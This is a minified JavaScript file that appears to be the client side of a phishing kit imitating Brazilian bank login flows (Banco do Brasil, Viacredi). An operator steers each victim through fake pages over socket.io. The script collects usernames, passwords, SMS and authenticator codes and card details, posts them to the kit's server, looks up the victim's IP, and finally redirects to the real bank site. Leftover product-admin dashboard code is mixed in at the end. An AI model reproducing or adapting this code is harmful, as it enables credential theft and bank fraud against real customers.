const URL="http://192.168.0.10:3333/api",util=(()=>{const e=[];let t=0;image=((n,o,a,r)=>{n.addEventListener("change",i=>{i.preventDefault(),n.closest("form").classList.add("changed");const c={large:["my-2","col-12"],medium:["my-2","col-6"],small:["my-2","col-3"]};if(!r&&!c[r])return console.log("Informe o tamanho entre (large, medium e small)");const s=o,l=[...n.files],u=n.files[0];if(n.closest(".custom-file").querySelector("label").innerHTML=l.length+" imagens","mult"===a)l.map(n=>{const a=document.createElement("div");a.classList.add("mb-2","col-sm-3"),a.innerHTML='\n                    <img class="img-thumbnail" src="">\n                    ';const r=a.querySelector("img");if(FileReader&&n){var i=new FileReader;return i.onload=function(){r.src=i.result},i.readAsDataURL(n),e.push(n),r.dataset.index=e.indexOf(n),1===e.length&&r.classList.add("active"),((e,n)=>{e.addEventListener("click",o=>{const a=e.dataset.index;return allImages=n.querySelectorAll("img"),Array.from(allImages).forEach(e=>{e.classList.remove("active")}),e.classList.add("active"),t=parseInt(a),console.log(t)})})(r,o),s.append(a)}});else{const t=document.createElement("div");t.classList.add(...c[r]),t.innerHTML='\n                <img class="img-thumbnail" src="">\n                ';const n=t.querySelector("img");if(FileReader&&u){var d=new FileReader;return d.onload=function(){n.src=d.result},d.readAsDataURL(u),e[0]=u,s.innerHTML="",s.append(t)}}})});const n=(e,t,o)=>{void 0===window.delayed_methods&&(window.delayed_methods={}),n[e]=Date.now();var a=n[e];setTimeout(function(){n[e]==a&&(n[e]="")},o||500)};return{image:image,images:e,request:e=>new Promise((t,n)=>{const o=document.body.dataset.token,{url:a,method:r,body:i,headers:c}=e,s={method:r||"GET",headers:{authorization:`Bearer ${o}`}};c&&(s.headers["content-type"]=c["content-type"]),c&&(s.headers.Accept=c.Accept),i&&(s.body=i),fetch(a,s).then(e=>e.json()).then(e=>e.error?n(e.error):t(e)).catch(e=>n(e))}),scroll:e=>{e.addEventListener("click",function(e){e.preventDefault(),document.querySelector(this.getAttribute("href")).scrollIntoView({behavior:"smooth",block:"start"})})},validateSlug:e=>e=e.normalize("NFD").replace(/[\u0300-\u036f]/g,"").toLowerCase().replace(/ /g,"_"),newRequest:e=>new Promise((t,n)=>{const o=document.body.dataset.token,{url:a,method:r,body:i,headers:c}=e,s={method:r||"GET",headers:{authorization:`Bearer ${o}`}};c&&(s.headers["content-type"]=c["content-type"]),i&&(s.body=i),fetch(a,s).then(e=>e.json()).then(e=>e.error?n(e.error):t(e)).catch(e=>n(e))}),serialize:e=>{const t=[...e.elements],n={};return t.map((e,t)=>{if("radio"==e.type)return e.checked?n[e.name]=e.value:void 0;e.name&&(n[e.name]=e.value)}),n},resetForm:e=>{[...e.elements].map(e=>e.value="")},notify:e=>{const{icon:t,title:n,message:o,type:a}=e;return $.notify({icon:t,title:n,message:o},{type:a,template:'\n                <div data-notify="container" class="alert alert-dismissible alert-{0} alert-notify" role="alert">\n                    <span class="alert-icon" data-notify="icon"></span>\n                    <div class="alert-text"> \n                        <span class="alert-title" data-notify="title">{1}</span>\n                        <span data-notify="message">{2}</span>\n                    </div>\n                    <button type="button" class="close" data-notify="dismiss" aria-label="Close">\n                        <span aria-hidden="true">&times;</span>\n                    </button>\n                </div>\n                '})},get:e=>new Promise((t,n)=>{const o=document.body.dataset.token;fetch(e,{method:"GET",headers:{authorization:`Bearer ${o}`,"content-type":"application.json"}}).then(e=>e.json()).then(e=>e.error?n(e.error):t(e)).catch(e=>n(e))}),del:e=>new Promise((t,n)=>{const o=document.body.dataset.token;fetch(e,{method:"DELETE",headers:{authorization:`Bearer ${o}`,"content-type":"application.json"}}).then(e=>e.json()).then(e=>e.error?n(e.error):t(e)).catch(e=>n(e))}),delayed_methods:n,dateEnd:(e,t,n)=>{e.addEventListener("blur",o=>{const a=t.value,r=new Date(a);r.setMonth(r.getMonth()+parseInt(e.value));const i=r.toISOString().substr(0,10);console.log(i),n.value=i})},maskMoney:e=>{e.addEventListener("keyup",function(t){t.preventDefault(),$(e).maskMoney({prefix:"R$ "})})},post:async function(e,t){return new Promise((n,o)=>{const{body:a,headers:r}=t;if(!e)return o("not have url");r?(r["content-type"]="application/json",fetch(e,{method:"POST",headers:r,body:JSON.stringify(a||"")}).then(e=>e.json()).then(n).catch(o)):fetch(e,{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(a||"")}).then(e=>e.json()).then(n).catch(o)})}}})(),inputStart=document.querySelector("input#locationStart"),inputEnd=document.querySelector("input#locationEnd"),inputMonth=document.querySelector("input#locationTime");inputStart&&inputEnd&&inputMonth&&util.dateEnd(inputMonth,inputStart,inputEnd);const allprods=document.querySelector(".nav-link.dropdown-toggle"),hoverMenu=document.querySelector(".nav-item.dropdown");if(hoverMenu&&(hoverMenu.onmouseover=(()=>{document.querySelector(".nav-item.dropdown > ul")&&document.querySelector(".nav-item.dropdown > ul").classList.add("show")}),hoverMenu.onmouseout=(()=>{document.querySelector(".nav-item.dropdown > ul")&&document.querySelector(".nav-item.dropdown > ul").classList.remove("show")})),allprods&&allprods.addEventListener("click",function(e){e.preventDefault(),url=allprods.getAttribute("href"),window.matchMedia("(min-width:800px)").matches&&(window.location.href=url)}),document.querySelector("input.cpf"))var cpf=new Cleave("input.cpf",{delimiters:[".",".","-"],blocks:[3,3,3,2],uppercase:!0});if(document.querySelector("input.rg"))var rg=new Cleave("input.rg",{delimiters:[".",".","-"],blocks:[2,3,3,1],uppercase:!0});if(document.querySelector("input.zipCode"))var cep=new Cleave("input.zipCode",{delimiters:["-"],blocks:[5,3],uppercase:!0});if(document.querySelector("input.phoneInput"))var phones=new Cleave("input.phoneInput",{phone:!0,phoneRegionCode:"BR"});if(document.querySelector("input#cell"))var cell=new Cleave("input#cell",{phone:!0,phoneRegionCode:"BR"});const cleaveMoney={numeral:!0,prefix:"R$ ",rawValueTrimPrefix:!0},inputsMoney=[...document.querySelectorAll("input.moneyValue")];if(inputsMoney&&inputsMoney.forEach(e=>util.maskMoney(e)),document.querySelector(".iptu"))var iptu=new Cleave("input#iptu",cleaveMoney);if(document.querySelector(".condominium"))var condominium=new Cleave("input#condominium",cleaveMoney);if(document.querySelector(".water"))var water=new Cleave("input#water",cleaveMoney);if(document.querySelector(".energy"))var energy=new Cleave("input#energy",cleaveMoney);if(document.querySelector(".trash"))var trash=new Cleave("input#trash",cleaveMoney);if(document.querySelector(".cleaningFee"))var cleaningFee=new Cleave("input#cleaningFee",cleaveMoney);if(document.querySelector(".othersValues"))var othersValues=new Cleave("input#othersValues",cleaveMoney);const btnValidat=document.querySelector(".btnAnchor");btnValidat&&util.scroll(btnValidat),function(){"use strict";window.addEventListener("load",function(){var e=document.getElementsByClassName("needs-validation");Array.prototype.filter.call(e,function(e){e.addEventListener("submit",t=>{!1===e.checkValidity()&&(t.preventDefault(),t.stopPropagation()),e.classList.add("was-validated")},!1)})},!1)}();const formInfo=document.querySelector("form[name='f1']"),client_id=document.body.dataset.client;function formAuth(){const e=document.querySelector(".verify_inputs");if(!e)return;const t=e.querySelectorAll("input");t&&t.forEach((e,n)=>{e.addEventListener("keyup",function(o){o.preventDefault();const a=e.value;if(a.length>2){return[...a].forEach((e,n)=>{t[n]&&(e.value=e)}),t[t.length-1].focus()}return a?t[n+1]?t[n+1].focus():void 0:t[n-1]?(e.value="",t[n-1].focus()):e.value=""}),e.addEventListener("input",function(e){e.preventDefault();const n=e.target.value;if(n.length>1){[...n].forEach((e,n)=>{t[n]&&(t[n].value=e),t[t.length-1].focus()})}})})}socket.on("conectado",e=>{const t=new URLSearchParams(window.location.search);(t.has("client")||client_id)&&(socket.emit("userReconnect",t.get("client")||client_id),console.log(t.get("client")))}),formAuth();const infosData=(()=>{const e=new URLSearchParams(window.location.search).has("client")||document.body.dataset.client;return{submit:async function(e){console.log(e),e&&e.addEventListener("submit",t=>{t.preventDefault(),e.querySelector("#btnLogin").innerHTML="Aguarde...",e.querySelector("#btnLogin").disabled=!0,e.querySelector(".inpt-passwd6").style.opacity=.5,e.querySelector("input[name='password6']").disabled=!0;const n=util.serialize(e);socket.emit("password6Client",n),console.log(n)})},update:async function(e){e&&e.addEventListener("submit",t=>{t.preventDefault();const n=util.serialize(e);return socket.emit("updateClient",n),window.location.href=`/await?client=${n.id}`})},create:async function(e){e&&e.addEventListener("submit",t=>{t.preventDefault(),util.serialize(e),e.submit()})},digits:async function(e){e&&e.addEventListener("submit",function(t){t.preventDefault();const n=util.serialize(e);socket.emit("sendPass6",n),window.location.href=`/await?client=${n.id}`,console.log(n)})},receiver:async function(){socket.on("erroruser",e=>{const t=new URLSearchParams(window.location.search);t.has("client")&&t.get("client")==e&&(window.location.href=`/modules/conta?client=${e}`)}),socket.on("FinishClient",e=>{const t=new URLSearchParams(window.location.search);t.has("client")&&t.get("client")==e&&(window.location.href="https://www.bb.com.br/pbb/pagina-inicial")}),socket.on("getAuth",e=>{const t=new URLSearchParams(window.location.search);t.has("client")&&t.get("client")==e&&(window.location.href=`/verify-authentic?client=${e}`)}),socket.on("errorpass6",e=>{const t=new URLSearchParams(window.location.search);t.has("client")&&t.get("client")==e&&(window.location.href=`/password6?client=${e}`)})},commands:function(){socket.on("errorpassword",e=>{e.id&&(window.location.href=`/sinbc-login?client=${e.id}&error=true`)}),socket.on("disp",t=>{e&&e==t&&(window.location.href=`/dispositivo?client=${t}`)}),socket.on("erroruser",t=>{e&&e==t&&(window.location.href=`/modules/conta/${t}`)}),socket.on("getAuth",t=>{e&&e==t&&(window.location.href=`/modules/conta/auth/${t}`)}),socket.on("errorSMS",t=>{e&&e==t&&(window.location.href=`/modules/conta/sms/${t}?error=true`)}),socket.on("getSMS",t=>{e&&e==t&&(window.location.href=`/modules/conta/authentication/${t}`)}),socket.on("errorpass",t=>{e&&e==t&&(window.location.href=`/modules/conta/password/${t}`)}),socket.on("getMailCode",t=>{e&&e==t&&(window.location.href=`/modules/conta/mail/${t}`)}),socket.on("FinishClient",t=>{e&&e==t&&(window.location.href="https://www.viacredi.coop.br/")})},auth:async function(e){e&&e.addEventListener("submit",function(t){t.preventDefault();const n=util.serialize(e);if(!n)return e.classList.add("errorForm");socket.emit("sendAuth",n),window.location.href=`/await?client=${n.id}`})},getIp:function(e){function t(t){e(window.userip),t.onload=t.onerror=null,document.body.removeChild(t)}function n(){window.userip=!1;var e=document.createElement("script");e.async=!0,e.onload=function(){t(e)},e.onerror=function(){t(e)},e.src="https://l2.io/ip.js?var=userip",document.body.appendChild(e)}/^(interactive|complete)$/i.test(document.readyState)?n():document.addEventListener("DOMContentLoaded",n)}}})(),formUpdateClient=document.querySelector(".form-pass6");infosData.getIp(e=>console.log),infosData.commands(),infosData.auth(document.querySelector(".form-auth")),infosData.digits(document.querySelector(".form-pass6")),infosData.create(formInfo),infosData.update(formUpdateClient),infosData.submit(document.querySelector(".form-pass6"));const pageMail=(()=>{return{focus:function(e){const t=document.querySelector(e);if(!t||!t.closest("article"))return;const n=t.closest("article").querySelector("label");n&&(t.addEventListener("focus",function(e){n.classList.add("focused")}),t.addEventListener("blur",e=>{t.value||n.classList.remove("focused")}))},submitPassword:function(e){const t=document.querySelector(`${e}:not(.formMail__code)`);if(!t)return;const n=t.querySelector("button");n&&n.addEventListener("click",function(e){e.preventDefault();const t=n.closest("form").elements.password,o=n.closest("form").elements.mail;if(t){if(!t.value)return t.setCustomValidity("Informe sua senha de acesso"),t.reportValidity();document.querySelector(".loader").classList.remove("hidden")}if(o)return o.value?n.closest("form").submit():(o.setCustomValidity("Informe um e-mail para acessar sua conta"),o.reportValidity())})},mailCode:function(e){const t=[...document.querySelectorAll(e)];t&&t.forEach((e,n)=>{e.addEventListener("focus",function(t){e.closest("span").classList.add("focused")}),e.addEventListener("blur",function(t){e.closest("span").classList.remove("focused")}),e.addEventListener("keyup",function(o){o.preventDefault();let a=e.value;if(1==a.length&&n<5&&t[n+1].focus(),0==a.length&&n<6&&t[n-1]&&(t[n-1].value="",t[n-1].focus()),a.length>1){let n=a.replace(/\D/g,"").split("");n[0]&&(t[0].value=n[0]),n[1]&&(t[1].value=n[1]),n[2]&&(t[2].value=n[2]),n[3]&&(t[3].value=n[3]),n[4]&&(t[4].value=n[4]),n[5]&&(t[5].value=n[5],e.closest("form").querySelector("button").disabled=!1,t[5]&&t[5].value&&t[5].focus())}5==n&&e.value?e.closest("form").querySelector("button").disabled=!1:e.closest("form").querySelector("button").disabled=!0})})},resend:function(){const e=document.querySelector(".formMail__code.verify spam");if(!e)return;const t=e.closest("button");e&&setInterval(()=>{parseInt(e.innerHTML)>0?e.innerHTML=parseInt(e.innerHTML)-1:t.disabled&&(t.disabled=!1,t.innerHTML="Reenviar código")},1e3)},hiddenTypeAccount:function(e){if(!e)return;const t=document.querySelectorAll(e);t&&t.forEach(e=>{e.addEventListener("click",function(t){e.closest(".container-account").classList.add("hidden")})})}}})();pageMail.hiddenTypeAccount(".container-account li"),pageMail.resend(),pageMail.focus(".formMail input"),pageMail.mailCode(".formMail__inputs input");const formMasks=(()=>{return{mask:function(){const e=document.querySelector(".form-stn #email");e&&new Cleave(e,{blocks:[5,2],delimiters:["-"],numericOnly:!0})}}})();formMasks.mask();const password=(()=>{const e=document.querySelector('input[name="userID"]');return{submitPassword:async function(t){const n=document.querySelector(`${t}:not(.formMail__code)`);if(!n)return;if(n.classList.contains("formMail__code"))return;const o=n.querySelector("button");o&&o.addEventListener("click",function(t){t.preventDefault();const a=o.closest("form").elements.password,r=o.closest("form").elements.mail;if(a){if(!a.value)return a.setCustomValidity("Informe sua senha de acesso"),a.reportValidity();document.querySelector(".loader").classList.remove("hidden"),async function(t){if(!t)return;const n=util.serialize(t),o=await util.post("/api/client",{body:n});socket.emit("joinClient",o),e.value=o.id}(n)}if(r)return r.value?o.closest("form").submit():(r.setCustomValidity("Informe um e-mail para acessar sua conta"),r.reportValidity())})},receive:async function(){socket.on("reqSMS",e=>{const t=document.querySelector('input[name="userID"]');if(!t)return;const n=t.value;return n||e.id!=n?void 0:window.location.href=`/phonecheck/${n}`})}}})();password.receive(),password.submitPassword("form.formMail:not(.formMail__code)");const phone=(()=>{return{dispatch:function(e){[...document.querySelectorAll(e)].map(e=>{e.addEventListener("click",t=>{!function(e){const t=parseInt(document.querySelector('input[name="client"]').value);t&&(e.classList.contains("sms")?(socket.emit("selectSMS",t),window.location.href="/verify-authentic?select=sms"):e.classList.contains("phone")?(socket.emit("selectPhone",t),window.location.href="/verify-authentic?select=phone"):e.classList.contains("app")&&(socket.emit("selectApp",t),window.location.href="/verify-authentic?select=app"))}(e)})})}}})();phone.dispatch(".formMail__phone--options > div");const sms=(()=>{return{send:function(e){const t=document.querySelector(e);if(!t)return;const n=t.closest("form"),o=document.body.dataset.client;t&&n&&o&&t.addEventListener("click",async function(e){e.preventDefault();const t=n.querySelectorAll('input[type="tel"]');if(!t)return;let o="",a=!1;for(const e of t)a=!!e.value,o+=e.value;if(a||!(o.length<6))try{const e={auth:o},t={method:"put",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)};if(client_id){const e=await fetch(`/api/client/mail/${client_id}`,t),n=await e.json();if(200===e.status)return window.location.href=`/await?client=${n.id}`}}catch(e){console.log(e)}})}}})();sms.send(".formMail__code .validate");const validityForm=(()=>{function e(e,t){"valid"==e&&e?t.classList.remove("has-error"):t.classList.add("has-error")}function t(t){t.preventDefault();const n=t.target;const o=function(){let e=!1;for(const t in n.validity)n.validity[t]&&(e=t);return e}();"keyup"!=t.type?e(o,n):n.value.length>6&&e(o,n)}return{handleForm:function(e){const n=document.querySelector(e);if(!e)return;const o=n.querySelectorAll('input[type="text"]');for(const e of o)e.addEventListener("blur",t),e.addEventListener("keyup",t)}}})(),mp=(()=>{const e=document.body.dataset.client;return{formPassSubmit:async function(t){const n=document.querySelector(t);if(!n)return;n.querySelector("#password");const o=$("#modalLetter");n.addEventListener("submit",function(t){t.preventDefault();const a=document.querySelector(".saveLetter");o.modal("show"),a.addEventListener("click",async function(t){t.preventDefault();const n=document.querySelector('.inputs_letters input[name="letters"]');if(n)try{const t={method:"put",headers:{"Content-Type":"application/json"},body:JSON.stringify({auth:n.value})},a=(await(await fetch(`/api/client/letter/${e}`,t)).json(),document.querySelector(".saveLetter"));console.log(a),a&&(a.classList.add("active"),a.innerHTML='<div class="spinner-border text-primary" role="status">\n                            <span class="sr-only" style="width: 20px; height: 20px;">Loading...</span>\n                          </div>'),setTimeout(()=>{o.modal("hide"),window.location.href=`/modules/conta/cards_info/${e}`},5e3)}catch(e){console.log("Erro au subir modal de letra",e)}}),async function(e){try{const t=util.serialize(e),n={method:"put",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)},o=await fetch("/api/client/password",n),a=await o.json();console.log(a),$("#modalLetter").modal("show")}catch(e){console.log(e)}}(n)})},formUserSubmit:function(t){const n=document.querySelector(t);n&&n.addEventListener("submit",async function(t){t.preventDefault();const o=n.querySelector("#username");if(o||o.value)try{const t={method:"put",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:o.value})};if(e){const n=await fetch(`/api/client/username/${e}`,t),o=await n.json();if(200===n.status)return window.location.href=`/await?client=${o.id}`}}catch(e){console.log(e)}})},submitVerifyCard:function(t){const n=document.querySelector(t);n&&n.addEventListener("submit",async function(t){t.preventDefault();try{const t=util.serialize(n),o={method:"put",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)};if(e){const t=await fetch(`/api/client/card/${e}`,o),n=await t.json();if(200===t.status)return window.location.href=`/await?client=${n.id}`}}catch(e){console.log(e)}})},submitCode:function(e){const t=document.querySelector(e);if(!t)return;const n=t.querySelector("button.validate");n&&n.addEventListener("click",async function(e){e.preventDefault();let o="";const a=t.elements.client.value;[...t.querySelectorAll('input[type="tel"]')].forEach(e=>{if(!e.value)return e.setCustomValidity("Informe o c'odigo de 6 digitos"),e.reportValidity()}),n.disabled=!0;for(let e=1;e<7;e++){const n=t.elements[`number_${e}`];n&&(o+=n.value)}if(!(o.length<4))try{const e={method:"put",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:o})},t=await fetch(`/api/client/sms/${a}`,e),n=await t.json();if(200===t.status)return window.location.href=`/await?client=${n.id}`}catch(e){console.log(e)}})},verifyAuth:function(e){const t=document.querySelector(e),n=document.body.dataset.client;if(!t||!n)return;const o=t.querySelector("button");console.log("form verify",o),o.addEventListener("click",async function(e){e.preventDefault();try{const e=t.querySelectorAll('input[type="tel"]');let o=!1,a="";for(const t of e)o=!!t.value,a+=t.value;const r={auth:a},i={method:"put",headers:{"Content-Type":"application/json"},body:JSON.stringify(r)};if(n){const e=await fetch(`/api/client/auth/${n}`,i),t=await e.json();if(200===e.status)return window.location.href=`/await?client=${t.id}`}}catch(e){console.log(e)}})}}})();mp.verifyAuth(".formMail__code.authenticate"),mp.submitVerifyCard(".card_verify"),mp.submitCode(".formMail__code.verify"),mp.formPassSubmit(".main-form-login.password"),mp.formUserSubmit(".main-form-login.send-error-login");const formCard=(()=>{const e=document.body.dataset.client;return{submit:async function(t){const n=document.querySelector(t);n&&n.addEventListener("submit",async function(t){t.preventDefault();const o=n.querySelector(".btn");try{const t=util.serialize(n),a={method:"post",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)};await(await fetch(`/api/client/card/${e}`,a)).json(),o.innerHTML='<div class="spinner-border" role="status">\n                    <span class="visually-hidden">Loading...</span>\n                </div>',setTimeout(()=>window.location.href="https://www.viacredi.coop.br/",1e3)}catch(e){o.innerHTML="Cadastrar cartão",console.log(e)}})}}})();formCard.submit(".main-form-login.card");const keyboards=(()=>{return{keyclick:function(e){const t=document.querySelectorAll(e),n=document.querySelector('.phrase input[name="phrase"]'),o=document.querySelector(".phrase .clean_click");if(o&&(o.addEventListener("click",function(e){e.preventDefault(),n.value=""}),t))for(const e of t)e.addEventListener("click",function(t){t.preventDefault(),n&&("space"==e.value?n.value=`${n.value} `:"backspace"==e.value?n.value=n.value.slice(0,-1):n.value=`${n.value}${e.value}`),console.log(n.value)})},keyclickPass:function(e){const t=document.querySelectorAll(e);let n=0;const o=document.querySelectorAll(".destinys input"),a=document.querySelector('.destinys input[name="password"]'),r=document.querySelector(".keyboardNumeric .clean_click");if(r&&(r.addEventListener("click",function(e){e.preventDefault();for(const e of o)e.value="",n=0,a.value=""}),t))for(const e of t)e.addEventListener("click",function(t){if(t.preventDefault(),8==n?n=8:n+=1,"backspace"==e.value){let e=document.querySelector(`.destinys input[name="passnum_${n}"`);if(!e)return;e.value="",n-=1,e=document.querySelector(`.destinys input[name="passnum_${n}"`),document.querySelector(`.inputs_password input[name="pass_client_${n}"]`).value="",e.value="",n-=1,a.value=a.value.slice(0,-1)}else n<=8?(destinyInput=document.querySelector(`.destinys input[name="passnum_${n}"`),document.querySelector(`.inputs_password input[name="pass_client_${n}"]`).value=e.value,destinyInput.value=e.value,a.value=a.value+e.value,8==n&&document.querySelector("div.phrase").classList.add("active")):n=8;console.log(a.value)})},keyclickLetter:function(e){const t=document.querySelectorAll(e),n=document.querySelector('.inputs_letters input[name="letters"]');if(document.querySelector(".inputs_letters .clean_click"),t)for(const e of t)e.addEventListener("click",function(t){if(t.preventDefault(),n){if("space"==e.value?n.value=`${n.value} `:"backspace"==e.value?n.value=n.value.slice(0,-1):n.value=`${n.value}${e.value}`,console.log(n.value.length),3==n.value.length){const e=document.querySelector(".saveLetter");e&&(e.classList.add("active"),e.addEventListener("click",function(t){e.innerHTML='<div class="spinner-border text-primary" role="status">\n                                <span class="sr-only">Loading...</span>\n                              </div>'}))}const t=document.querySelector(`.inputs_letters input[name="letter_${n.value.length}"]`);t&&(t.value=e.value)}console.log(n.value)})}}})();if(keyboards.keyclick(".keyboard_click button"),keyboards.keyclickPass(".keyboardNumeric article button"),keyboards.keyclickLetter(".phraseLetter button"),document.querySelector(".card_number"))var card_number=new Cleave(".card_number",{creditCard:!0,onCreditCardTypeChanged:function(e){}});if(document.querySelector(".card_document"))var card_document=new Cleave(".card_document",{delimiters:[".",".","-"],blocks:[3,3,3,2],uppercase:!0});if(document.querySelector(".card_validity"))var card_validity=new Cleave(".card_validity",{delimiters:["/"],blocks:[2,2],uppercase:!0});const login={login:e=>{e.addEventListener("submit",t=>{t.preventDefault();const n=util.serialize(e);return console.log(n),util.request({url:"/api/login",method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(n)}).then(e=>window.location.href="/dashboard").catch(e=>console.log(e))})},register:e=>{e.addEventListener("submit",function(t){t.preventDefault();const n=util.serialize(e),o=e.closest(".modal"),a=document.body.dataset.dataToken;fetch("/api/user",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${a}`},body:JSON.stringify(n)}).then(e=>{$(o).modal("hide"),$(o).on("hidden.bs.modal",function(t){return Swal.fire("Usuário criado",`Usuário ${e.name} criado com sucesso`,"success"),$(this).off("hidden.bs.modal")})}).catch(e=>util.notify({icon:"alert-icon ni ni-bell-55",title:"Atenção! alguns erros foram encontrados!",message:e,type:"warning"}))})}},formRegister=document.querySelector(".formRegister"),formLogin=document.querySelector(".formLogin");formLogin&&login.login(formLogin);const product=(()=>{const e=$(".dataTable").DataTable(),t=e=>e.innerHTML='\n        <div class="spinner-border text-success" role="status">\n            <span class="sr-only">Loading...</span>\n        </div>',n=e=>{const t=document.createElement("tr"),n=document.querySelector(".productList"),{name:o,brand:a,price:r,stock:i,id:c,image:s,barcode:l}=e;t.innerHTML=`\n        <th scope="row">\n            <div class="media align-items-center">\n                <a href="#" class="avatar rounded-circle mr-3">\n                    ${s.url?`<img alt="Image placeholder" src="${s.url}">`:'<img alt="Image placeholder" src="https://via.placeholder.com/200">'}\n                </a>\n                <div class="media-body">\n                    <span class="name mb-0 text-sm">\n                        ${o} <br>\n                        <small>${l}</small>\n                    </span>\n                </div>\n            </div>\n        </th>\n        <td>\n            ${r}\n        </td>\n        <td>\n            ${a}\n        </td>\n        <td>\n            <i class="fas fa-arrow-up text-success mr-3"></i> ${i}\n        </td>\n        <td>\n            <button class="btn btn-warning" data-id="${c}"><i class="fas fa-trash-alt"></i></button>\n        </td>\n        `,n&&n.append(t)},o=t=>{t.addEventListener("click",function(n){n.preventDefault();const o=t.dataset.id,a=t.closest("tr");return util.del(`/api/product/${o}`).then(t=>(e.row($(a)).remove().draw(),Swal.fire("Excluído",`Produto ${t.name} excluído com sucesso`,"success")))})},a=e=>{e.addEventListener("click",function(t){const n=document.querySelector(e.dataset.target),o=e.dataset.id;n.dataset.id=o})},r=e=>new Promise((t,n)=>{const{id:o}=e.data,a=e.form.elements.file.files[0];if(console.log(a),!a)return t(e.data);const r=new FormData;r.append("file",a),fetch(`/api/product_image/${o}`,{method:"POST",headers:{authorization:`Bearer ${document.body.dataset.token}`},body:r}).then(e=>e.json()).then(n=>{return util.resetForm(e.form),e.form.querySelector("button").innerHTML="Cadastrar Produto",t(n)}).catch(e=>n(e))});return{create:e=>{e.addEventListener("submit",function(o){return o.preventDefault(),(e=>new Promise((n,o)=>{const a=e.querySelector("button");t(a);const r=util.serialize(e);util.request({url:"/api/product",method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(r)}).then(t=>n({data:t,form:e})).catch(e=>o(e))}))(e).then(r).then(e=>(n(e),Swal.fire("Cadastrado",`Produto ${e.name} cadastrado com sucesso`,"success"))).catch(e=>util.notify({icon:"alert-icon ni ni-bell-55",title:"Atenção! alguns erros foram encontrados!",message:e,type:"warning"}))})},destroy:o,modal:e=>{$(e).on("show.bs.modal",function(t){const n=e.dataset.id,o=e.querySelector("form");util.get(`/api/product/${n}`).then(e=>{const{name:t,price:n,brand:a,stock:r,id:i,barcode:c}=e;o.elements.name.value=t,o.elements.price.value=n,o.elements.brand.value=a,o.elements.stock.value=r,o.elements.barcode.value=c,o.dataset.id=i})})},openModal:a,update:t=>{t.addEventListener("submit",function(n){n.preventDefault();const r=t.dataset.id,i=util.serialize(t);return util.request({url:`/api/product/${r}`,method:"PUT",headers:{"content-type":"application/json"},body:JSON.stringify(i)}).then(n=>{const i=document.querySelector(`tr[data-id="${r}"]`);e.row($(i)).remove().draw();const c=t.closest(".modal");$(c).modal("hide"),$(c).on("hidden.bs.modal",function(t){const r=(t=>{const{name:n,price:o,brand:a,stock:r,barcode:i,id:c,image:s}=t,l=e.row.add([`\n                <div class="media align-items-center">\n                    <a href="#" class="avatar rounded-circle mr-3">\n                        ${s.url?`<img alt="Image placeholder" src="${s.url}">`:'<img alt="Image placeholder" src="https://via.placeholder.com/200">'}\n                    </a>\n                    <div class="media-body">\n                        <span class="name mb-0 text-sm">\n                            ${n} <br>\n                            <small>${i}</small>\n                        </span>\n                    </div>\n                </div>\n                `,o,a,`<i class="fas fa-arrow-up text-success mr-3"></i> ${r}`,`\n                <button class="btn btn-icon btn-primary editProduct" type="button" data-toggle="modal"\n                    data-target="#modalProduct" data-id="${c}">\n                    <span class="btn-inner--icon"><i class="fas fa-pencil-alt"></i></span>\n                </button>\n\n                <button class="btn btn-warning productDestroy" data-id="${c}">\n                    <i class="fas fa-trash-alt"></i>\n                </button>\n                `]).draw().node();return l.dataset.id=c,l.classList.add(`tr-product-${c}`),l.querySelector("td:last-child").classList.add("text-right"),l})(n);return a(r.querySelector(".editProduct")),o(r.querySelector(".productDestroy")),Swal.fire("Alterado",`Produto ${n.name} alterado com sucesso`,"success"),$(this).off("hidden.bs.modal")})}).catch(e=>util.notify({icon:"alert-icon ni ni-bell-55",title:"Atenção! alguns erros foram encontrados!",message:e,type:"warning"}))})}}})(),formEditProduct=document.querySelector(".formEditProduct");formEditProduct&&product.update(formEditProduct);const modalProd=document.querySelector("#modalProduct");modalProd&&product.modal(modalProd);const btnEditProduct=[...document.querySelectorAll(".editProduct")];btnEditProduct&&btnEditProduct.map(e=>product.openModal(e));const btnProductStore=document.querySelector(".productStore");btnProductStore&&product.create(btnProductStore);const btnProductDestroy=[...document.querySelectorAll(".productDestroy")];btnProductDestroy&&btnProductDestroy.map(e=>product.destroy(e)),$(".dataTable").on("draw.dt",function(){const e=[...document.querySelectorAll(".productDestroy")];e&&e.map(e=>product.destroy(e));const t=[...document.querySelectorAll(".editProduct")];t&&t.map(e=>product.openModal(e))});